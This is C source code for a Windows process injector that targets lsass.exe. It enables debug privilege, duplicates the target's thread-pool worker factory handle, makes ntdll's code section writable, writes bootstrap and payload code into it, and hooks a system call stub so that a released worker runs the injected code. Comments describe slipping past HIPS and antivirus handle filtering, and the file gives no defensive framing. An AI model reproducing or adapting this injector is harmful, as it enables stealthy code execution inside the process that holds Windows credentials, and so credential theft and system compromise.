///*****This module contains code for the injector implementation.*****

#include "global.h"
#include "payload.h"
#include "auxfuncs.h"

#define TARGET_PROCESS_NAME L"lsass.exe"
#define NT_SYSCALL_START 0x0	///System call numbers always started with 0.
#define NT_SYSCALL_END 0x1000	///0x1000 is the begin of win32k system calls and hence, the last possible NT syscall is 0xFFF.
#define REL_JUMP_SIZE 5
#define RT_SECTION_SIZE PAGE_SIZE
#define RT_SECTION_RESERVED_BYTES 1024
#define NTDLL_TEXT_OFFSET PAGE_SIZE
#define NTDLL_TEXT_SIZE_WIN10 (1024 * 1008)
#define WORKER_FACTORY_ALL_ACCESS 0xF00FF


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;



//typedef NTSTATUS (*PLDR_GET_PROCEDURE_ADDRESS)(_In_ PVOID BaseAddress, _In_ PANSI_STRING Name, _In_ ULONG Ordinal, _Out_ PVOID *ProcedureAddress);

//void payloadRoutineBegin(void);
//ULONG_PTR payloadRoutineEnd(void);

///We define a generic system call structure which held true ever since Windows NT 3.51.
typedef struct _NT_SYSCALL_STUB {
	BYTE movR64R64[3];
	BYTE movR32Imm32;
	ULONG syscallNumber;
	USHORT intelSyscallInstruction;
	BYTE ret;
	BYTE nopPadding[5];
} NT_SYSCALL_STUB, *PNT_SYSCALL_STUB;

void dispError(NTSTATUS status) {
	ULONGLONG dummy;
	dummy = 0;
	NtRaiseHardError(status, 1, 0, (PULONG_PTR)&dummy, 0, (PULONG)&dummy);
}

NTSTATUS openWorkerFactory(PHANDLE pWorkerFactory, HANDLE hProcess, HANDLE targetPid) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	HANDLE hLocalWorkerFactory = NULL;
	HANDLE hRemoteWorkerFactory = NULL;
	HANDLE hIoCompletion = NULL;
	static USHORT objIndex = 0;
	ULONG handleInfoSize = 0;
	SIZE_T handleInfoMemSize = 0;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleList = NULL;
	SYSTEM_HANDLE_INFORMATION_EX handleInfo;

	do {
		if (pWorkerFactory)
			*pWorkerFactory = NULL;

		if (!pWorkerFactory || !hProcess || INVALID_HANDLE_VALUE == hProcess || !targetPid) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!objIndex) {
			///We need this for the next call, and the parameters are quite uncritical.
			status = NtCreateIoCompletion(&hIoCompletion, IO_COMPLETION_ALL_ACCESS, NULL, 4);
			if (status) {
				hIoCompletion = NULL;
				break;
			}

			///We create an archetypal TpWorkerFactory object in order to later deduce the object type from it...  
			status = NtCreateWorkerFactory(&hLocalWorkerFactory, WORKER_FACTORY_ALL_ACCESS, NULL, hIoCompletion, INVALID_HANDLE_VALUE, NtCurrentPeb(), NtCurrentTeb(), 0x2, 0, 0);
			if (status) {
				hLocalWorkerFactory = NULL;
				break;
			}
		}

		status = NtQuerySystemInformation(SystemExtendedHandleInformation, &handleInfo, sizeof(SYSTEM_HANDLE_INFORMATION_EX), &handleInfoSize);
		if ((STATUS_BUFFER_TOO_SMALL != status) && (STATUS_BUFFER_OVERFLOW != status) && (STATUS_INFO_LENGTH_MISMATCH != status))
			break;

		handleInfoMemSize = sizeof(SYSTEM_HANDLE_INFORMATION_EX) + handleInfo.NumberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX);
		handleInfoMemSize += (handleInfoMemSize / 2);	///We should allocate much additional memory since the
														///total system handle count may extremely fluctuate.
														///If between the two information requests the handle count happens
														///to largely rise we will have allocated memory to only hold handle info structs
														///as much as the count was before the rise. Thus the safety margin.
		status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &pHandleList, 0, &handleInfoMemSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (status) {
			pHandleList = NULL;
			break;
		}

		handleInfoSize = (ULONG)handleInfoMemSize;
		///Now retrieve the entire list of all handles currently opened on this system.
		///The list contains not only the process which has opened the handle but also
		///the handle value. Additionally it contains the type number of each object the handles are opened to.
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleList, handleInfoSize, &handleInfoSize);
		if (status)
			break;
		
		if (!objIndex) {
			///Since we exactly know our pid as well as our WorkerFactory handle value
			///we can exploit our local WorkerFactory in order to figure out the TpWorkerFactory object type.
			///Kind of workaround for NtQueryObject(ObjectTypeInformation) since this call doesn't provide useful info.
			for (ULONG i = 0; i < pHandleList->NumberOfHandles; i++) {
				if (NtCurrentTeb()->ClientId.UniqueProcess == pHandleList->Handles[i].UniqueProcessId) {
					if (hLocalWorkerFactory == pHandleList->Handles[i].HandleValue) {
						objIndex = pHandleList->Handles[i].ObjectTypeIndex;
						break;
					}
				}
			}

			if (0 == objIndex) {	///Assumption 0 is invalid object type
				status = STATUS_OBJECTID_NOT_FOUND;
				break;
			}
		}

		///Now check for any handles incorporating the determined TpWorkerFactory object id and at the
		///same time existing in our target process 
		for (ULONG i = 0; i < pHandleList->NumberOfHandles; i++) {
			if (targetPid == pHandleList->Handles[i].UniqueProcessId) {
				if (objIndex == pHandleList->Handles[i].ObjectTypeIndex) {
					///Finally clone the TpWorkerFactory handle into ourselves so we can perform remote control on the corresponding thread pool later on.
					status = NtDuplicateObject(hProcess, pHandleList->Handles[i].HandleValue, INVALID_HANDLE_VALUE, &hRemoteWorkerFactory, WORKER_FACTORY_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0);
					if (!status)
						break;
				}
			}
		}
		if (!hRemoteWorkerFactory) {
			status = STATUS_OBJECT_NOT_EXTERNALLY_BACKED;
			break;
		}

		*pWorkerFactory = hRemoteWorkerFactory;
	} while (status);

	if (hLocalWorkerFactory)
		NtClose(hLocalWorkerFactory);

	if (hIoCompletion)
		NtClose(hIoCompletion);

	if (pHandleList)
		NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pHandleList, &handleInfoMemSize, MEM_RELEASE);

	return status;
}

///Pretty self explaining... one provides a valid RVA and a base address corresponding to an on-disk image
///and gets a pointer to the file offset which at the same time is a valid pointer into the on-disk like
///memory buffer.
PVOID rvaToFileOffset(_In_ ULONG rva, _In_ PVOID pMemoryBase) {
	PIMAGE_NT_HEADERS pNtdllPeHdr = (PIMAGE_NT_HEADERS)((PUCHAR)pMemoryBase + ((PIMAGE_DOS_HEADER)pMemoryBase)->e_lfanew);
	PIMAGE_SECTION_HEADER pFirstSecHdr = IMAGE_FIRST_SECTION(pNtdllPeHdr);
	for (ULONG i = 0; i < pNtdllPeHdr->FileHeader.NumberOfSections; i++) {
		if ((pFirstSecHdr[i].VirtualAddress <= rva) && (rva < pFirstSecHdr[i].VirtualAddress + pFirstSecHdr[i].Misc.VirtualSize))
			return  (PUCHAR)pMemoryBase + rva + pFirstSecHdr[i].PointerToRawData - pFirstSecHdr[i].VirtualAddress;
	}
	return NULL;
}

#define MIN_VM_ACCESS_MASK ( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)

NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLONG injectionHookAddress, DWORD timeoutMilliseconds){
	LARGE_INTEGER interval;
	SIZE_T bytesWritten;
	ULONG callDisplacement;
	ULONG_PTR bootstrapAddress;
	ULONG oldHookProtect = 0x0;
	PVOID pNtdllRxBegin = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	SIZE_T bytesToProtect = PAGE_SIZE;
	USHORT lineNum = 0;
	ULONG injectionCode[] = { 0xE890050F, 0xBBBBBBBB };
	ULONG* pSyscallArray = (PULONG)((ULONG_PTR)&bootstrapCodeBegin + 0x60);
	//ULONG_PTR* pLdrGetProcedureAddress = (PULONG_PTR)((ULONG_PTR)&bootstrapCodeBegin + 0x40);
	//ANSI_STRING aMessageBeep;
	//UNICODE_STRING uKernelbaseDll;
	//PVOID pKernelbase = NULL;
	//RtlInitUnicodeString(&uKernelbaseDll, L"user32.dll");
	//RtlInitAnsiString(&aMessageBeep, "MessageBeep");
	//PMESSAGE_BEEP fpMessageBeep = NULL;
	interval.QuadPart = timeoutMilliseconds * (long long)(-10000);
	//MessageBeep(MB_ICONEXCLAMATION);
	do {
		bytesToProtect = NTDLL_TEXT_SIZE_WIN10;	///<=== VERY bad. ntdll RX size is hardcoded!
		pNtdllRxBegin = (PVOID)(NTDLL_TEXT_OFFSET + (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)((PLDR_DATA_TABLE_ENTRY)NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink)->InLoadOrderLinks.Flink)->DllBase);
		bootstrapAddress = (ULONG_PTR)pNtdllRxBegin + bytesToProtect - RT_SECTION_SIZE + RT_SECTION_RESERVED_BYTES;	///Last 3 KB of RT section
		callDisplacement = (ULONG)(bootstrapAddress - (injectionHookAddress + 3) - REL_JUMP_SIZE);	///3 is due to injectionHookAddress != jmp instruction address.
		injectionCode[1] = callDisplacement;
		g_originalSyscallCode = *(PULONGLONG)injectionHookAddress;
		//status = LdrLoadDll(NULL, NULL, &uKernelbaseDll, &pKernelbase);
		//if (status)
		//	break;
		//GetProcAddress;
		//FARPROC
		//status = LdrGetProcedureAddress(pKernelbase, &aMessageBeep, 0, (FARPROC*)&fpMessageBeep);
		//if(status)
		//	break;
		//fpMessageBeep(MB_ICONERROR);
		status = NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldHookProtect);
		if (status)
			break;

		//*pLdrGetProcedureAddress = (ULONG_PTR)fpMessageBeep;
		//pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtRaiseHardError)->syscallNumber;
		pSyscallArray[0] = ((PNT_SYSCALL_STUB)NtDelayExecution)->syscallNumber;
		pSyscallArray[1] = ((PNT_SYSCALL_STUB)NtOpenFile)->syscallNumber;
		pSyscallArray[2] = ((PNT_SYSCALL_STUB)NtDeviceIoControlFile)->syscallNumber;
		pSyscallArray[3] = ((PNT_SYSCALL_STUB)NtClose)->syscallNumber;
		pSyscallArray[4] = ((PNT_SYSCALL_STUB)NtCreateSemaphore)->syscallNumber;
		pSyscallArray[5] = ((PNT_SYSCALL_STUB)NtOpenProcess)->syscallNumber;
		pSyscallArray[6] = ((PNT_SYSCALL_STUB)NtCreateMutant)->syscallNumber;
		//myWPrintf(&lineNum, L"ptr %llx", *pLdrGetProcedureAddress);

		//myWPrintf(&lineNum, L"ptr %p", pLdrGetProcedureAddress);
		//((PMESSAGE_BEEP)fpMessageBeep)(MB_ICONEXCLAMATION);
		status = NtWriteVirtualMemory(hProcess, (PVOID)bootstrapAddress, (PVOID)g_bootstrapCodeBegin, g_bootstrapCodeEnd - g_bootstrapCodeBegin, &bytesWritten);
		if (status)
			break;

		status = NtWriteVirtualMemory(hProcess, (PVOID)(bootstrapAddress+0x100), (PVOID)payloadRoutineBegin, (ULONG_PTR)payloadRoutineEnd - (ULONG_PTR)payloadRoutineBegin, &bytesWritten);
		if (status)
			break;

		NtSuspendProcess(hProcess);
		status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
		if (status)
			break;

	} while (status);

	//if (pKernelbase)
	//	LdrUnloadDll(pKernelbase);

	myWPrintf(&lineNum, L"aosdhfiu0x%llxwreev", g_bootstrapCodeBegin);

	status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
	NtDelayExecution(FALSE, &interval);
	NtResumeProcess(hProcess);
	NtDelayExecution(FALSE, &interval);
	NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);

	return status;
}

NTSTATUS openProcsByName(PHANDLE pProcess, PUNICODE_STRING pProcName, BOOLEAN useDebugPrivilege) {
	SYSTEM_PROCESS_INFORMATION procInfo;
	OBJECT_BASIC_INFORMATION processHandleInfo;
	CLIENT_ID cid;
	BOOLEAN oldValue;
	HANDLE pid;
	BOOLEAN injectionSucceeded = FALSE;
	NTSTATUS status = STATUS_CACHE_PAGE_LOCKED;
	ULONG procListSize = 0;
	ULONGLONG memSize = 0;
	ULONG obQueryLen = 0;
	PVOID pProcListHead = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcEntry = NULL;
	HANDLE hProcess = NULL;

	if (!pProcName || !pProcess )
		return STATUS_INVALID_PARAMETER;

	*pProcess = NULL;

	///Since we specify a buffer size of 0 the buffer must overflow for sure even if there was running a
	///single process only. If we don't receive the dedicated error, something other has gone wrong
	///and we cannot rely on the return length.
	status = NtQuerySystemInformation(SystemProcessInformation, &procInfo, procListSize, &procListSize);
	if (STATUS_INFO_LENGTH_MISMATCH != status)
		return status;

	memSize = PAGE_ROUND_UP(procListSize) + PAGE_SIZE; ///We better allocate one page extra
													   ///since between our "test" call and the real call below
													   ///additional processes might be started. (race condition)
	status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, 0, &memSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (status)
		return status;

	///By now, we have allocated a buffer large enough for the complete process list,
	///even if some new processes have been started in the mean time.
	///Hence, the next call is entirely expected to succeed.
	procListSize = (ULONG)memSize;
	status = NtQuerySystemInformation(SystemProcessInformation, pProcListHead, procListSize, &procListSize);
	if (status) {
		memSize = 0;
		NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, &memSize, MEM_RELEASE);
		return status;
	}

	HANDLE hWorkerFactory = NULL;
	OBJECT_ATTRIBUTES procAtttr;
	InitializeObjectAttributes(&procAtttr, NULL, 0, NULL, NULL);
	pid = NULL;
	cid.UniqueProcess = NULL;
	cid.UniqueThread = NULL;
	pProcEntry = pProcListHead;             ///The list of all system processes is a so called singly linked list.

	if (useDebugPrivilege) {
		status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);
		if (status)         ///Since we're for some reason supposed to use the SeDebugPrivilege,
			return status;  ///we fail deliberately if we can't enable it. 
	}
	//BOOLEAN fla = FALSE;
	while (pProcEntry->NextEntryOffset) { ///If NextEntryOffset member is NULL, we have reached the list end (tail).
		pProcEntry = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pProcEntry + pProcEntry->NextEntryOffset);
		//DebugPrint2A("PID: %d, %wZ", pProcEntry->UniqueProcessId, pProcEntry->ImageName);
		if (0 == RtlCompareUnicodeString(pProcName, &pProcEntry->ImageName, TRUE)) {
			//if (!fla) {
			//	fla = TRUE;
			//	continue;
			//}
			cid.UniqueProcess = pProcEntry->UniqueProcessId;
			if (hProcess)
				NtClose(hProcess);

			status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &procAtttr, &cid);
			if (status) {
				hProcess = NULL;
				continue;
			}

			status = NtQueryObject(hProcess, ObjectBasicInformation, &processHandleInfo, sizeof(OBJECT_BASIC_INFORMATION), &obQueryLen);
			if (status)		///Not sure if this call ever will fail...
				continue;

			///Maybe, HIPS just wanted to deny PROCESS_TERMINATE/PROCESS_SUSPEND right?
			///If so, we don't care. We're only interested in VM rights.
			if ((MIN_VM_ACCESS_MASK | PROCESS_DUP_HANDLE) & ~processHandleInfo.GrantedAccess)
				continue;

			status = openWorkerFactory(&hWorkerFactory, hProcess, cid.UniqueProcess);
			if (status)
				continue;

			status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForWorkViaWorkerFactory + 8, 10);
			if (!status) {
				injectionSucceeded = TRUE;
				break;
			}
		}
	}

	if (hWorkerFactory)
		NtClose(hWorkerFactory);

	if (injectionSucceeded)
		status = STATUS_SUCCESS;

	memSize = 0;
	NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, &memSize, MEM_RELEASE); ///We don't need the list anymore.

	if (!cid.UniqueProcess)
		return STATUS_OBJECT_NAME_NOT_FOUND;

	if(hProcess)
		NtClose(hProcess);

	return status;
}



void mymain(void){
	NTSTATUS status = STATUS_PENDING;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	UNICODE_STRING uProcess;
	OBJECT_ATTRIBUTES thrdAttr;
	//CLIENT_ID cid;
	//HANDLE hCompletion = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES completionAttr;
	//SIZE_T memSize = 0;
	LARGE_INTEGER interval;
	//PHANDLE pPidList = NULL;

	uProcess.Buffer = TARGET_PROCESS_NAME;
	uProcess.Length = sizeof(TARGET_PROCESS_NAME) - sizeof(UNICODE_NULL);
	uProcess.MaximumLength = sizeof(TARGET_PROCESS_NAME);
	InitializeObjectAttributes(&thrdAttr, NULL, 0, NULL, NULL);
	InitializeObjectAttributes(&completionAttr, NULL, 0, NULL, NULL);
	///The requested operation waits until you click a button.
	dispError(STATUS_PENDING);
	interval.QuadPart = -20000000;
	//do {
		//do {
			status = openProcsByName(&hProcess, &uProcess, TRUE);
			//NtDelayExecution(FALSE, &interval);
		//} while (!status);
		if (status)
		dispError(status);
		NtTerminateProcess(INVALID_HANDLE_VALUE, status);
			//break;
		////NtTimer
		////if (status)
		////	break;
		//
		////NtGetC
		//cid.UniqueProcess = (HANDLE)5836;
		//cid.UniqueThread = (HANDLE)5840;
		//status = NtCreateIoCompletion(&hCompletion, IO_COMPLETION_ALL_ACCESS, &completionAttr, 2);
		//if (status)
		//	break;
		//
		//status = NtCreateWorkerFactory(&hProcess, SYNCHRONIZE, &completionAttr, hCompletion, INVALID_HANDLE_VALUE, (PUCHAR)RtlSetProcessIsCritical+3, (PVOID)NtAcceptConnectPort, 70, 1024*PAGE_SIZE, PAGE_SIZE);
		//if (status)
		//	break;
		//////status = NtGetNextThread(hProcess, NULL, THREAD_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0, &hProcess);
		//////status = NtOpenThread(&hProcess, THREAD_ALL_ACCESS, &thrdAttr, &cid);
		////
		//////status = NtQueueApcThreadEx(hProcess, NULL, (PVOID)RtlSetProcessIsCritical, NULL, NULL, NULL);
		////if (status)
		////	break;

		//dispError(STATUS_XML_ENCODING_MISMATCH);
	//} while (status);
	
	//if (*pPidList)
	//	NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pPidList, &memSize, MEM_RELEASE);

	//if (status)
	//	dispError(status);

	//dispError(status);


	//NtQueueApcThreadEx()
	//rvaToFileOffset()
	////selfUnmap();
	/////No image (except the own one) can be found...
	////dispError(STATUS_SECTION_NOT_IMAGE);

	/////Initialize everything...
	////status = initializeSyscallTable();
	////if (status) {
	////	dispError(status);
	////	return;
	////}
	//////DebugPrint2A("%wZ pid = %llu", *pProcName, pid);

	//////{
	//////	NtClose(*pProcess);
	//////	*pProcess = NULL;
	//////	return STATUS_UNSUCCESSFUL;
	//////}
	//////{    
	//////	NtClose(*pProcess);
	////////	*pProcess = NULL;
	////////	return status;
	////////}





	////dispError(status);

	//////status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForMultipleObjects, 200);
	//////if (!status) {
	//////	NtClose(hProcess);
	//////	break;
	//////}
	//////status = injectIntoProcess(hProcess, (ULONGLONG)&NtQueryValueKey, 3000);
	//////NtClose(hProcess);
	////
	//////if (!status)
	//////	break;

	////InitializeObjectAttributes(&procAttr, NULL, 0, NULL, NULL);
	////cid.UniqueThread = (HANDLE)0;
	////cid.UniqueProcess = pid;
	///////Opening a process for full access might be less suspicious than opening with our real intentions.
	////status = NtOpenProcess(pProcess, PROCESS_ALL_ACCESS, &procAttr, &cid);

	//if (useDebugPrivilege)
	//	///We don't have any clue if the privilege already was enabled,
	//	///so we simply restore the old status. Whether we do this call or not 
	//	///isn't anyhow related to the result of process opening.
	//	RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, oldValue, FALSE, &oldValue);

	////if (status)
	////	return status;   ///Most likely STATUS_ACCESS_DENIED if
	////					 ///either we didn't specify the useDebugPrivilege flag when opening a cross session process
	////					 ///or if we tried to open an elevated process while running non-elevated.

	////					 ///In x64 windows, HIPS or AV drivers have the possibility to legally
	////					 ///receive a notification if a process is about to open a handle to another process.
	////					 ///In those ObCallback routines they cannot completely deny the opening.
	////					 ///However, they are able to modify the access masks, so a handle supposed for VM operations still
	////					 ///will be lacking the PROCESS_VM_XXX rights, for example. If we therefore query the handle rights
	////					 ///we can still return an appropriate error if wasn't granted the rights we want
	////					 ///And are not going to fail at first when performing our process operations.


	///////Maybe, HIPS just wanted to deny PROCESS_TERMINATE/PROCESS_SUSPEND right?
	///////If so, we don't care. We're only interested in VM rights.
	////if (MIN_VM_ACCESS_MASK & ~processHandleInfo.GrantedAccess) {
	////	NtClose(*pProcess);
	////	*pProcess = NULL;
	////	return STATUS_UNSUCCESSFUL;
	////}

	/////...and demonstrate that we have hopefully succeeded.
	////status = testNtapiTable();
	////if (status)
	////	dispError(status);
}

//void testRoutine(void) {
//	ULONG_PTR dummyVar;
//	&dummyVar;
//}
